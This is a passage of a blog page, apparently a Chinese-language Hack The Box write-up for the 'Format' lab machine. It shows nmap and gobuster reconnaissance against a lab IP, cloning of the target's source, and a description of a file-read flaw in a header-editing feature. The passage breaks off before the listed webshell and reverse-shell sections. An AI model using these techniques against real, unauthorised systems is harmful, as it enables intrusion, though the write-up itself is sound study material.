@@ -1,0 +1,1271 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Format | Someb0dy&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Redis,NginxMisconfigure">
+    <meta name="description" content="FormatNmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.213 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-05-14 02:41 EDT Nmap scan report for localhost (10.10.11.213) Host is up (0.13s latency). Not sho">
+<meta name="keywords" content="Redis,NginxMisconfigure">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Format">
+<meta property="og:url" content="someb0dy.github.io/2023/06/26/Format/index.html">
+<meta property="og:site_name" content="Someb0dy&#39;s blog">
+<meta property="og:description" content="FormatNmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.213 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-05-14 02:41 EDT Nmap scan report for localhost (10.10.11.213) Host is up (0.13s latency). Not sho">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120343848-f4894d66-1ce8-4049-af4f-549a26f4e25f.png#averageHue=%23fafafa&clientId=u6ea49036-b440-4&from=paste&height=915&id=u190edc7b&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=106293&status=done&style=none&taskId=ub8152903-e0f8-4512-90e0-d6164f80377&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120352689-0e9e39cc-590f-459b-8282-80038201e6bc.png#averageHue=%23fbfbfb&clientId=u6ea49036-b440-4&from=paste&height=743&id=u081a2703&originHeight=836&originWidth=1867&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=89798&status=done&style=none&taskId=u4802391a-f3fc-4b8c-bc83-f4a870fe86a&title=&width=1659.5555555555557">
+<meta property="og:image" content="someb0dy.github.io/2023/06/26/Format/Format.assets/image-20230514145208904.png#id=NN9CG&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120367121-93184147-2e7d-42f6-bace-c0d53f56fdc5.png#averageHue=%23cab486&clientId=u6ea49036-b440-4&from=paste&height=844&id=ubc5f709a&originHeight=949&originWidth=1914&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=80262&status=done&style=none&taskId=udc7fb311-e2dc-44b0-a7b8-1d99c1a29e9&title=&width=1701.3333333333333">
+<meta property="og:image" content="someb0dy.github.io/2023/06/26/Format/Format.assets/image-20230514162555652.png#id=rN8Zh&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120378468-98d2fc33-6c3a-4e02-8223-9fc3fb34a225.png#averageHue=%232d2d2d&clientId=u6ea49036-b440-4&from=paste&height=769&id=u133aae6e&originHeight=865&originWidth=1570&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=256897&status=done&style=none&taskId=u715e9f47-8d35-448c-ad42-d3175e0e2b5&title=&width=1395.5555555555557">
+<meta property="og:image" content="someb0dy.github.io/2023/06/26/Format/Format.assets/image-20230514162816846.png#id=vDoYW&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120387848-7635bbe2-58f3-4da4-80fe-4869338fb6c7.png#averageHue=%2319364a&clientId=u6ea49036-b440-4&from=paste&height=250&id=ue81c6d1f&originHeight=281&originWidth=946&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=37716&status=done&style=none&taskId=u4a06cc9c-b9db-404a-8b18-24f46f5269f&title=&width=840.8888888888889">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120397510-96f2bdfe-62a0-4c13-9c7a-d5568369f5a4.png#averageHue=%23172f40&clientId=u6ea49036-b440-4&from=paste&height=851&id=uf647c464&originHeight=957&originWidth=1906&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=209862&status=done&style=none&taskId=ud7fa0bde-ee47-4dcf-aac9-4080848f7e9&title=&width=1694.2222222222222">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120408592-5873637e-67ad-4785-8253-4ff015cefc76.png#averageHue=%231a374b&clientId=u6ea49036-b440-4&from=paste&height=247&id=u5dd0e80b&originHeight=278&originWidth=1295&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=34822&status=done&style=none&taskId=u3463c5b9-5dfe-48fe-80c2-5ec94478a14&title=&width=1151.111111111111">
+<meta property="og:image" content="someb0dy.github.io/2023/06/26/Format/Format.assets/image-20230514163447371.png#id=bnXLA&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687582766877-d610dca0-2652-4040-938d-73b64571805a.png#averageHue=%237b9052&clientId=u3df09d10-6dd0-4&from=paste&height=638&id=ufb0cd5cf&originHeight=797&originWidth=1263&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=230831&status=done&style=none&taskId=ua7d31666-3e25-4af8-a023-6cd5068e291&title=&width=1010.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687588768718-f448aa7c-9986-4b5c-ba32-0b617109ebca.png#averageHue=%2319364a&clientId=u3df09d10-6dd0-4&from=paste&height=76&id=u7e7aeb95&originHeight=95&originWidth=451&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7155&status=done&style=none&taskId=u718bf427-7901-49b6-ab68-09ea8ee9daa&title=&width=360.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687590728412-55829076-484a-47d5-b983-0083a5e0a614.png#averageHue=%23d9d9d9&clientId=u3df09d10-6dd0-4&from=paste&height=646&id=udc5ed7ec&originHeight=808&originWidth=1262&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94842&status=done&style=none&taskId=uc995d0b6-e65f-495d-a492-8c514a71c2a&title=&width=1009.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687589217106-a7303d84-029d-4bf9-8f12-bd3b33dc28f7.png#averageHue=%23c1c0c0&clientId=u3df09d10-6dd0-4&from=paste&height=725&id=uadc02607&originHeight=906&originWidth=1679&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106037&status=done&style=none&taskId=u976dbbdd-ed09-4775-acc0-116d5e48cea&title=&width=1343.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687591193073-2d5a3ac1-e833-4b09-9cf1-242dde5dbc03.png#averageHue=%23c5ecef&clientId=u3df09d10-6dd0-4&from=paste&height=737&id=ubd04e387&originHeight=921&originWidth=1894&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156285&status=done&style=none&taskId=u4262dbd2-54b1-482a-9acc-2e435c7e7ca&title=&width=1515.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687591383165-d8997f8f-3c41-4725-9777-c5a3888ab116.png#averageHue=%23c0d8b3&clientId=u3df09d10-6dd0-4&from=paste&height=429&id=u42cd902b&originHeight=536&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37216&status=done&style=none&taskId=ucaa268b4-f829-48cc-83b4-225d300cb43&title=&width=1532.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687593130855-57601e9b-31c4-4aea-9a42-ae43f5761889.png#averageHue=%23312f2f&clientId=u3df09d10-6dd0-4&from=paste&height=625&id=uc80b40db&originHeight=781&originWidth=1244&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=223273&status=done&style=none&taskId=uf361d348-d74e-4fd0-8f4d-59dd65bd621&title=&width=995.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687593295125-0a97f9c5-62ce-4ec2-b90f-40b408d57bbe.png#averageHue=%2319364a&clientId=u3df09d10-6dd0-4&from=paste&height=526&id=ue399484a&originHeight=658&originWidth=957&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71869&status=done&style=none&taskId=ua3c93af7-0b58-4bb1-92b8-4c18bb03e4b&title=&width=765.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597411728-4230ebcd-188c-47f5-85a4-a81d01ba0713.png#averageHue=%23193244&clientId=u3df09d10-6dd0-4&from=paste&height=598&id=u27ce2323&originHeight=748&originWidth=1853&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=241135&status=done&style=none&taskId=uc487090c-6d22-467d-84f2-31ddc5e8262&title=&width=1482.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597793467-a0be2eaf-d0d4-49a3-8899-c97d74797a15.png#averageHue=%23c7aa74&clientId=u3df09d10-6dd0-4&from=paste&height=702&id=u48ce1598&originHeight=878&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49433&status=done&style=none&taskId=u4c32f589-3cbf-4202-b1fe-3bbacb63851&title=&width=1530.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597822302-751d925e-5a13-4fb1-a97f-3791807750c1.png#averageHue=%23121212&clientId=u3df09d10-6dd0-4&from=paste&height=498&id=ue00b8441&originHeight=623&originWidth=1470&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79858&status=done&style=none&taskId=u1f1c7cbc-1ebf-489e-86d7-b2145458166&title=&width=1176">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597834053-82688e30-3bbc-42b9-a5df-da5e10860697.png#averageHue=%23d0be88&clientId=u3df09d10-6dd0-4&from=paste&height=693&id=u9e4d5dc3&originHeight=866&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77348&status=done&style=none&taskId=ue9e2d37f-61a4-491a-a59f-5fa1e7604b3&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597849186-d5165f7f-4438-4adf-8edb-f5ad1836298b.png#averageHue=%23ececec&clientId=u3df09d10-6dd0-4&from=paste&height=650&id=u5b05905f&originHeight=813&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58537&status=done&style=none&taskId=ub568767a-3358-4fb4-99d3-a8616e0fe72&title=&width=1528.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687598078510-8aa618f4-88a3-477a-80db-a01fbcaf6523.png#averageHue=%232f2f2f&clientId=u3df09d10-6dd0-4&from=paste&height=590&id=u92fa9681&originHeight=738&originWidth=1259&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=191923&status=done&style=none&taskId=u01472c40-ec57-49a5-b4f8-a8525e744d8&title=&width=1007.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687598181948-064a74be-e51b-483d-8012-95f88eec871d.png#averageHue=%232e2d2d&clientId=u3df09d10-6dd0-4&from=paste&height=478&id=u0632d671&originHeight=597&originWidth=1213&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112495&status=done&style=none&taskId=ua5fde5b1-2219-4e5e-baac-af076a331f8&title=&width=970.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687598265863-5fcdde17-63fc-43bd-a15a-330de28d870f.png#averageHue=%23242423&clientId=u3df09d10-6dd0-4&from=paste&height=623&id=u3bfd708c&originHeight=779&originWidth=1414&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=198326&status=done&style=none&taskId=ub11af465-8ef8-438d-8ed7-ad4680cae80&title=&width=1131.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687600815842-0e4e6315-fed6-4c4b-8a07-1c9c9abb8178.png#averageHue=%23111111&clientId=u3df09d10-6dd0-4&from=paste&height=810&id=ue41a2bf7&originHeight=1012&originWidth=1652&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=272881&status=done&style=none&taskId=uf8683ed0-2402-491c-827f-24e8cb84165&title=&width=1321.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687602209214-5499c37b-5560-4898-a196-3b866d42165a.png#averageHue=%231a1a1a&clientId=u3df09d10-6dd0-4&from=paste&height=135&id=u8b7a0524&originHeight=169&originWidth=737&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16209&status=done&style=none&taskId=u786e75fb-ddbd-46d9-a755-923b6af2753&title=&width=589.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687602288184-401ab665-4ab2-4ce6-9780-d831af0ec0e6.png#averageHue=%23181818&clientId=u3df09d10-6dd0-4&from=paste&height=555&id=ub1fc0925&originHeight=694&originWidth=1201&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94353&status=done&style=none&taskId=ued984c5a-7488-42f9-ad6c-de6315d6465&title=&width=960.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687604711518-a70bc530-a8bf-443c-9e70-b9579f594c4a.png#averageHue=%23caaf77&clientId=u3df09d10-6dd0-4&from=paste&height=697&id=u8cc861db&originHeight=871&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49717&status=done&style=none&taskId=u1f352b1b-8b76-46ed-a4e6-94e670e6d98&title=&width=1517.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687604880427-2af1387e-e9be-4382-9db6-e4ffb83f2ab9.png#averageHue=%231e1c1c&clientId=u3df09d10-6dd0-4&from=paste&height=802&id=u168e3646&originHeight=1003&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=293034&status=done&style=none&taskId=u713dabce-a940-4546-8489-2f135c930bd&title=&width=1530.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687604998826-2dda9814-8cc9-47b7-a034-281c9bcba408.png#averageHue=%23262525&clientId=u3df09d10-6dd0-4&from=paste&height=407&id=u214927eb&originHeight=509&originWidth=1917&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=155537&status=done&style=none&taskId=uf59e7ae6-b0dc-4989-9759-b8dda5f9c2b&title=&width=1533.6">
+<meta property="og:updated_time" content="2023-06-25T16:12:05.418Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120343848-f4894d66-1ce8-4049-af4f-549a26f4e25f.png#averageHue=%23fafafa&clientId=u6ea49036-b440-4&from=paste&height=915&id=u190edc7b&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=106293&status=done&style=none&taskId=ub8152903-e0f8-4512-90e0-d6164f80377&title=&width=1706.6666666666667">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Someb0dy</h5>
+          <a href="mailto:1362460837@qq.com" target="_blank" rel="noopener" title="1362460837@qq.com" class="mail">1362460837@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Giraffe711" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Format</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Format</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-06-25T16:10:41.991Z" itemprop="datePublished" class="page-time">
+  2023-06-26
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Format"><span class="post-toc-number">1.</span> <span class="post-toc-text">Format</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#扫描子域名"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">扫描子域名</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#app-microblog-htb"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">app.microblog.htb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#x2F-etc-x2F-nginx-x2F-site-available-x2F-default"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">/etc/nginx/site-available/default</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#寻找利用点"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">寻找利用点</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#provisionProUser"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">provisionProUser</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#add-header"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">add-header</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#webshell写入"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">webshell写入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#反弹shell"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">反弹shell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pspy"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">pspy</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#redis-cli"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">redis-cli</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#hash-类型"><span class="post-toc-number">1.9.1.</span> <span class="post-toc-text">hash 类型</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#list-类型"><span class="post-toc-number">1.9.2.</span> <span class="post-toc-text">list 类型</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#root"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">root</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Format"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Format</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-06-26 00:10:41" datetime="2023-06-25T16:10:41.991Z"  itemprop="datePublished">2023-06-26</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Format"><a href="#Format" class="headerlink" title="Format"></a>Format</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀kali)-[~]
+└─# nmap -A 10.10.11.213
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 02:41 EDT
+Nmap scan report for localhost (10.10.11.213)
+Host is up (0.13s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
+|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
+|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
+80/tcp   open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Site doesn&#39;t have a title (text/html).
+3000/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://microblog.htb:3000/
+</code></pre>
+<p>nmap 结果，发现一个microblog.htb域名，添加到hosts文件</p>
+<p>80端口访问不了404，3000端口访问为</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120343848-f4894d66-1ce8-4049-af4f-549a26f4e25f.png#averageHue=%23fafafa&clientId=u6ea49036-b440-4&from=paste&height=915&id=u190edc7b&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=106293&status=done&style=none&taskId=ub8152903-e0f8-4512-90e0-d6164f80377&title=&width=1706.6666666666667" alt="image-20230514144802252.png" title="">
+                </div>
+                <div class="image-caption">image-20230514144802252.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120352689-0e9e39cc-590f-459b-8282-80038201e6bc.png#averageHue=%23fbfbfb&clientId=u6ea49036-b440-4&from=paste&height=743&id=u081a2703&originHeight=836&originWidth=1867&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=89798&status=done&style=none&taskId=u4802391a-f3fc-4b8c-bc83-f4a870fe86a&title=&width=1659.5555555555557" alt="](Format.assets/image-20230514144802252.png#id=DY9VX&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514145208904.png" title="">
+                </div>
+                <div class="image-caption">](Format.assets/image-20230514144802252.png#id=DY9VX&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514145208904.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="Format.assets/image-20230514145208904.png#id=NN9CG&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>有一套源代码，用git clone 命令下载下来</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Format]
+└─# git clone http://microblog.htb:3000/cooper/microblog.git
+Cloning into &#39;microblog&#39;...
+remote: Enumerating objects: 61, done.
+remote: Counting objects: 100% (61/61), done.
+remote: Compressing objects: 100% (47/47), done.
+remote: Total 61 (delta 4), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (61/61), 703.74 KiB | 70.00 KiB/s, done.
+Resolving deltas: 100% (4/4), done.
+</code></pre>
+<h2 id="扫描子域名"><a href="#扫描子域名" class="headerlink" title="扫描子域名"></a>扫描子域名</h2><p>果断尝试扫描子域名</p>
+<pre><code class="bash">┌──(root💀kali)-[~]
+└─# gobuster vhost -u http://microblog.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-1
+10000.txt -t 100
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://microblog.htb
+[+] Method:          GET
+[+] Threads:         100
+[+] Wordlist:        /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.3
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+2023/05/14 02:47:08 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: admin.microblog.htb Status: 200 [Size: 1588]
+Found: app.microblog.htb Status: 200 [Size: 3976]
+Found: sunny.microblog.htb Status: 200 [Size: 3732]
+Progress: 114257 / 114442 (99.84%)===============================================================
+2023/05/14 02:55:03 Finished
+===============================================================
+</code></pre>
+<pre><code class="bash">10.10.11.213 microblog.htb
+10.10.11.213 admin.microblog.htb
+10.10.11.213 app.microblog.htb
+10.10.11.213 sunny.microblog.htb
+</code></pre>
+<p>一共4个域名</p>
+<h2 id="app-microblog-htb"><a href="#app-microblog-htb" class="headerlink" title="app.microblog.htb"></a>app.microblog.htb</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120367121-93184147-2e7d-42f6-bace-c0d53f56fdc5.png#averageHue=%23cab486&clientId=u6ea49036-b440-4&from=paste&height=844&id=ubc5f709a&originHeight=949&originWidth=1914&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=80262&status=done&style=none&taskId=udc7fb311-e2dc-44b0-a7b8-1d99c1a29e9&title=&width=1701.3333333333333" alt="image-20230514162555652.png" title="">
+                </div>
+                <div class="image-caption">image-20230514162555652.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="Format.assets/image-20230514162555652.png#id=rN8Zh&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这里有一个功能点是新增一个子域名，并且可以编辑这个子域名中一些内容</p>
+<p>我们新增完子域名后，需要在&#x2F;etc&#x2F;hosts文件中添加解析才能访问到</p>
+<p>点击edit site,可以修改header 和 txt</p>
+<p>我们抓取到修改header的报文</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120378468-98d2fc33-6c3a-4e02-8223-9fc3fb34a225.png#averageHue=%232d2d2d&clientId=u6ea49036-b440-4&from=paste&height=769&id=u133aae6e&originHeight=865&originWidth=1570&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=256897&status=done&style=none&taskId=u715e9f47-8d35-448c-ad42-d3175e0e2b5&title=&width=1395.5555555555557" alt="image-20230514162816846.png" title="">
+                </div>
+                <div class="image-caption">image-20230514162816846.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="Format.assets/image-20230514162816846.png#id=vDoYW&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>发现可以读取文件内容</p>
+<p>原因是</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120387848-7635bbe2-58f3-4da4-80fe-4869338fb6c7.png#averageHue=%2319364a&clientId=u6ea49036-b440-4&from=paste&height=250&id=ue81c6d1f&originHeight=281&originWidth=946&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=37716&status=done&style=none&taskId=u4a06cc9c-b9db-404a-8b18-24f46f5269f&title=&width=840.8888888888889" alt="](Format.assets/image-20230514163354915.png#id=JncGI&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514163354915.png" title="">
+                </div>
